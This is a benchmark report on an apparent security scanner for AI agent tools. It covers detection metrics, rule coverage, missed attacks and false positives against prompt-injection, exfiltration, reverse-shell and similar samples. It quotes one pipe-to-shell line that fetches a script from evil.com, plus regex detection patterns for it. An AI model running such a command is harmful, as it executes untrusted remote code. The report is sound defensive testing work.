# AgentShield Benchmark Results — V2

Generated: 2026-03-13
Samples: 24 malicious + 20 benign = 44 total
Duration: 231ms

## Summary

| Metric | Value |
|--------|-------|
| Malicious samples | 24 |
| Benign samples | 20 |
| True Positives | 22/24 |
| False Negatives | 2 |
| True Negatives | 18/20 |
| False Positives | 2 |
| **Recall** | **91.7%** |
| **Precision** | **91.7%** |
| **F1 Score** | **91.7%** |
| **FPR** | **10.0%** |
| **Accuracy** | **90.9%** |

## Rule Coverage

All 20 rules tested. Rules triggered in benchmark:

| Rule | TP Triggers | FP Triggers | Status |
|------|-------------|-------------|--------|
| prompt-injection | 11 files | 0 | ✅ Strong |
| backdoor | 3 files | 1 (test-runner.py) | ⚠️ FP on restricted eval |
| credential-hardcode | 1 file | 0 | ✅ |
| crypto-mining | 1 file | 0 | ✅ |
| data-exfil | 2 files | 1 (http-client.py) | ⚠️ FP on legit HTTP + env |
| env-leak | 1 file | 0 | ✅ |
| network-ssrf | 1 file | 0 | ✅ |
| obfuscation | 0 (caught by backdoor) | 0 | ⚠️ Overlapping |
| phone-home | 1 file | 0 | ✅ |
| privilege | 1 file | 0 | ✅ |
| reverse-shell | 1 file | 0 | ✅ |
| sensitive-read | 6 files | 0 | ✅ Strong |
| skill-risks | 3 files | 0 | ⚠️ Fires but marked FP |
| supply-chain | 0 | 0 | ❌ No detection |
| tool-shadowing | 1 file | 0 | ✅ |
| toxic-flow | 0 (caught by prompt-injection) | 0 | ⚠️ Not triggering independently |

## Gap Analysis

### False Negatives (Missed Attacks)

#### 1. `18-supply-chain.sh` — `curl | bash` not detected
- **Pattern:** `curl -fsSL https://evil.com/install.sh | bash`, `wget -qO- ... | sh`
- **Root cause:** `supply-chain` rule doesn't have pipe-to-shell patterns
- **Fix:** Add regex for `curl.*\|.*bash`, `wget.*\|.*sh`, and similar piped execution

#### 2. `22-skill-risks.md` — Financial/system risks marked as FP
- **Pattern:** Financial ops (buy/sell orders, fund transfers), system modification
- **Root cause:** `skill-risks` fires correctly at `info` severity but marks all findings as `possibleFalsePositive: true`, so benchmark ignores them
- **Fix:** When multiple risk indicators co-occur, escalate severity to `warning`

### False Positives (Innocent Flagged)

#### 1. `14-http-client.py` — Legitimate HTTP client
- **Trigger:** `data-exfil` — sees `os.environ` + `requests.get` in same file
- **Root cause:** Any file using env vars for config + making HTTP calls triggers exfil detection
- **Fix:** Distinguish reading a specific env var for config vs. dumping `os.environ`/`dict(os.environ)`

#### 2. `15-test-runner.py` — Restricted eval in test runner
- **Trigger:** `backdoor` — `eval()` matched
- **Root cause:** `eval()` with `{"__builtins__": {}}` (sandboxed) still flagged
- **Fix:** Check if eval has restricted builtins; downgrade to info if sandboxed

## Malicious Samples Detail

| File | Detected | Critical | Warning | Rules |
|------|----------|----------|---------|-------|
| 01-instruction-override.md | ✅ | 0 | 7 | prompt-injection |
| 02-identity-manipulation.md | ✅ | 0 | 8 | prompt-injection |
| 03-system-prompt-attacks.md | ✅ | 0 | 10 | prompt-injection |
| 04-hidden-instructions.md | ✅ | 1 | 7 | prompt-injection, sensitive-read |
| 05-behavioral-hijacking.md | ✅ | 1 | 6 | tool-shadowing, prompt-injection |
| 06-tool-poisoning.md | ✅ | 0 | 5 | prompt-injection |
| 07-data-exfiltration.md | ✅ | 0 | 5 | prompt-injection, sensitive-read |
| 08-encoding-evasion.md | ✅ | 0 | 4 | prompt-injection |
| 09-advanced-attacks.md | ✅ | 0 | 12 | prompt-injection, sensitive-read |
| 10-backdoor-eval.py | ✅ | 3 | 0 | backdoor |
| 11-credential-leak.py | ✅ | 3 | 1 | credential-hardcode, sensitive-read |
| 12-crypto-miner.py | ✅ | 4 | 0 | crypto-mining |
| 13-data-exfil.py | ✅ | 2 | 4 | data-exfil, env-leak, sensitive-read, skill-risks |
| 14-env-exfil.py | ✅ | 1 | 1 | data-exfil, sensitive-read |
| 15-reverse-shell.sh | ✅ | 2 | 0 | reverse-shell |
| 16-phone-home.py | ✅ | 1 | 1 | backdoor, phone-home |
| 17-obfuscated-payload.py | ✅ | 3 | 0 | backdoor |
| **18-supply-chain.sh** | **❌** | 0 | 0 | *(none)* |
| 19-ssrf.py | ✅ | 1 | 0 | network-ssrf |
| 20-tool-shadow.md | ✅ | 0 | 2 | prompt-injection |
| 21-toxic-flow.md | ✅ | 0 | 1 | prompt-injection |
| **22-skill-risks.md** | **❌** | 0 | 0 | *(info only, auto-FP)* |
| 23-sensitive-read.py | ✅ | 0 | 6 | sensitive-read, skill-risks |
| 24-privilege-escalation.sh | ✅ | 0 | 1 | sensitive-read, skill-risks |

## Benign Samples Detail

| File | Clean | Critical | Warning | Notes |
|------|-------|----------|---------|-------|
| 01-weather-tool.md | ✅ | 0 | 0 | |
| 02-code-formatter.md | ✅ | 0 | 0 | |
| 03-git-helper.md | ✅ | 0 | 0 | |
| 04-database-query.md | ✅ | 0 | 0 | |
| 05-translation.md | ✅ | 0 | 0 | |
| 06-image-resizer.md | ✅ | 0 | 0 | |
| 07-markdown-preview.md | ✅ | 0 | 0 | |
| 08-calculator.md | ✅ | 0 | 0 | |
| 09-spell-checker.md | ✅ | 0 | 0 | |
| 10-file-search.md | ✅ | 0 | 0 | |
| 11-security-tutorial.md | ✅ | 0 | 2 | Warnings on attack examples in docs (acceptable) |
| 12-deployment-script.sh | ✅ | 0 | 0 | curl for deploy correctly not flagged |
| 13-env-config-example.md | ✅ | 0 | 0 | Placeholder creds correctly not flagged |
| **14-http-client.py** | **❌** | 1 | 0 | FP: data-exfil on legit HTTP+env |
| **15-test-runner.py** | **❌** | 1 | 0 | FP: backdoor on sandboxed eval |
| 16-log-analyzer.py | ✅ | 0 | 0 | |
| 17-mcp-tool-legit.json | ✅ | 0 | 0 | |
| 18-cron-healthcheck.py | ✅ | 0 | 1 | Warning on timer+HTTP (acceptable) |
| 19-base64-codec.py | ✅ | 0 | 0 | base64 without eval = clean |
| 20-subprocess-tool.py | ✅ | 0 | 0 | |

## vs. Snyk Agent Scan — Feature Comparison

| Capability | AgentShield | Snyk Agent Scan |
|------------|-------------|-----------------|
| **Detection engine** | Local regex + heuristics | Cloud API (LLM-based?) |
| **Offline support** | ✅ Full offline | ❌ Requires API + token |
| **Prompt injection** | ✅ 12 categories | ✅ E001 |
| **Tool poisoning** | ✅ tool-shadowing rule | ✅ E002 |
| **Tool shadowing** | ✅ dedicated rule | ✅ E003 |
| **Malware patterns** | ✅ 15+ code rules | ✅ E006 |
| **Cross-tool toxic flow** | ✅ toxic-flow rule | ❌ |
| **Supply chain** | ⚠️ Rule exists, weak detection | ❌ |
| **Credential hardcode** | ✅ | ❌ |
| **Crypto mining** | ✅ | ❌ |
| **Reverse shell** | ✅ | ❌ |
| **SSRF** | ✅ | ❌ |
| **MCP auto-discover** | ⚠️ Basic | ✅ Full (stdio + config) |
| **Agent config discovery** | ❌ | ✅ (hardcoded paths) |
| **Cost** | Free | Free tier with daily limits |
| **Speed** | ~230ms (44 files) | Depends on API latency |
| **CI/CD integration** | ✅ GitHub Action | ✅ CLI |
| **F1 Score** | 91.7% (V2 benchmark) | Unknown (no public benchmark) |

## Next Steps (Priority)

1. **P0**: Fix `supply-chain` rule — add `curl|bash`, `wget|sh` pipe patterns
2. **P1**: Reduce FP on `data-exfil` — distinguish config env reads vs. full env dump
3. **P1**: Reduce FP on `backdoor` — recognize sandboxed eval patterns
4. **P2**: Make `skill-risks` escalate when multiple risk signals co-occur
5. **P2**: Make `toxic-flow` trigger independently on data flow descriptions
6. **P3**: Add evasion-resistant samples (Unicode homoglyphs, zero-width chars)
